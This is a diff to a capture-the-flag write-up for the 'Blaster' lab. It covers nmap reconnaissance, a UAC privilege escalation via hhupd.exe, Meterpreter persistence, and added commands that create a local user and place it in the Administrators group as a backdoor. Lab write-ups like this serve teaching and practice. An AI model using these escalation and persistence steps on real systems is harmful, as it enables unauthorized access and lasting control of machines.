@@ -7,6 +7,8 @@
 >
 > ![](.gitbook/assets/blaster.png)
 
+🎯 Target IP: `10.10.27.22`
+
 ## Recon
 
 ```bash
@@ -16,7 +18,7 @@ nmap 10.10.27.22
 	80/tcp   open  http
 	3389/tcp open  ms-wbt-server
 
-nmap -sCV -Pn 10.10.27.22 -oA blaster
+nmap -sV -sC -Pn -oA blaster 10.10.27.22
 ```
 
 ```bash
@@ -97,7 +99,7 @@ Check Internet Explorer history.
 
 ## Privilege Escalation
 
-- Use `hhupd.exe` to exploit the privilege escalation vulnerability present in the Windows Certificate Dialog box, a bug in the UAC mechanism
+- Run `hhupd.exe` to exploit the privilege escalation vulnerability present in the Windows Certificate Dialog box, a bug in the UAC mechanism
   - `cmd` user: `nt authority\system`
 
 
@@ -180,7 +182,7 @@ Meterpreter     : x86/windows
 ## Persistence
 
 ```bash
-run persistence -X # Deprecated
+run persistence -X # Deprecated and not working
 
 # Manual
 background
@@ -205,6 +207,16 @@ run
 - *Windows Defender blocked the persistence service payload in this case*
 
 ![](.gitbook/assets/image-20230510190355420.png)
+
+- Add a new user instead and give it administrative privileges
+
+```bash
+net user syselement pwd12345 /add
+
+net localgroup "Administrators" syselement /add
+
+net localgroup "Administrators"
+```
 
 ------
 
